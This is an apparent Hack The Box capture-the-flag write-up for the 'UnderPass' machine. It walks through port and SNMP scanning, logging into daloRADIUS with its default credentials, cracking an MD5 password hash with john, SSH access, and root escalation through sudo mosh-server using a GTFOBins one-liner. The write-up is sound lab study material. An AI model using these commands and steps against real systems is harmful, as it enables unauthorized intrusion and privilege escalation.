
### Initial access
Nmap
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Dir scan and file scan nothing return
UDPX
```
──(kali㉿kali)-[~/HTB/UnderPass]
└─$ udpx -t $target

        __  ______  ____ _  __                                                                                                                                                                                                              
       / / / / __ \/ __ \ |/ /                                                                                                                                                                                                              
      / / / / / / / /_/ /   /                                                                                                                                                                                                               
     / /_/ / /_/ / ____/   |                                                                                                                                                                                                                
     \____/_____/_/   /_/|_|                                                                                                                                                                                                                
         v1.0.7, by @nullt3r                                                                                                                                                                                                                
                                                                                                                                                                                                                                            
2026/09/18 00:47:37 [+] Starting UDP scan on 1 target(s)                                                                                                                                                                                    
2026/09/18 00:47:44 [*] 10.129.231.213:161 (snmp)
2026/09/18 00:47:57 [+] Scan completed

```

SNMP recon
```bash {5}
SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-TC::linux
DISMAN-EXPRESSION-MIB::sysUpTimeInstance = Timeticks: (108282) 0:18:02.82
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB

```

We test the path and it exist but we cant access
```
┌──(kali㉿kali)-[~/HTB/UnderPass]
└─$ curl http://10.129.231.213/daloradius/                        
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.129.231.213 Port 80</address>
</body></html>
                
```
Let dir scan it
```bash 
└─$ cat dirs | jq -r '.results[] | [.status, .url] | @tsv' | sort
200     http://10.129.231.213/daloradius/ChangeLog
200     http://10.129.231.213/daloradius/doc/install/INSTALL
200     http://10.129.231.213/daloradius/LICENSE
301     http://10.129.231.213/daloradius/app
301     http://10.129.231.213/daloradius/app/common
301     http://10.129.231.213/daloradius/app/common/includes
301     http://10.129.231.213/daloradius/app/common/library
301     http://10.129.231.213/daloradius/app/common/static
301     http://10.129.231.213/daloradius/app/common/templates
301     http://10.129.231.213/daloradius/app/operators
301     http://10.129.231.213/daloradius/app/operators/include
301     http://10.129.231.213/daloradius/app/operators/lang
301     http://10.129.231.213/daloradius/app/operators/library
301     http://10.129.231.213/daloradius/app/operators/notifications
301     http://10.129.231.213/daloradius/app/operators/static
301     http://10.129.231.213/daloradius/app/users
301     http://10.129.231.213/daloradius/app/users/include
301     http://10.129.231.213/daloradius/app/users/lang
301     http://10.129.231.213/daloradius/app/users/library
301     http://10.129.231.213/daloradius/app/users/notifications
301     http://10.129.231.213/daloradius/app/users/static
301     http://10.129.231.213/daloradius/contrib
301     http://10.129.231.213/daloradius/contrib/db
301     http://10.129.231.213/daloradius/contrib/heartbeat
301     http://10.129.231.213/daloradius/contrib/scripts
301     http://10.129.231.213/daloradius/contrib/scripts/maintenance
301     http://10.129.231.213/daloradius/doc
301     http://10.129.231.213/daloradius/doc/install
301     http://10.129.231.213/daloradius/library
301     http://10.129.231.213/daloradius/setup
                                                   
```

We can accces login page now using defaul cred `administrator:radius`
`http://10.129.231.213/daloradius/app/operators/login.php`
Access user in web and found the hash pass
`412DD4759978ACFCC81DEAB01B382403` crack it we have
```bash
┌──(kali㉿kali)-[~/HTB/UnderPass]
└─$ john   --wordlist=/usr/share/wordlists/rockyou.txt hash --format=raw-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
underwaterfriends (?)     
1g 0:00:00:00 DONE (2026-09-18 02:09) 7.692g/s 22957Kp/s 22957Kc/s 22957KC/s undiamecaiQ..underastig
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Cred `svcMosh:underwaterfriends`

We have ssh access
```bash
┌──(kali㉿kali)-[~/HTB/UnderPass]
└─$ ssh svcMosh@10.129.231.213
svcMosh@10.129.231.213's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Jan 11 01:27:32 PM UTC 2025

  System load:  0.35              Processes:             254
  Usage of /:   48.6% of 6.56GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.129.231.213
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jan 11 13:27:33 2025 from 10.10.14.62
svcMosh@underpass:~$ 

```

### Priv escalation
Sudo -l
```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

```

Using GTFOBIN
```
mosh --server='sudo mosh-server' 127.0.0.1 /bin/sh

```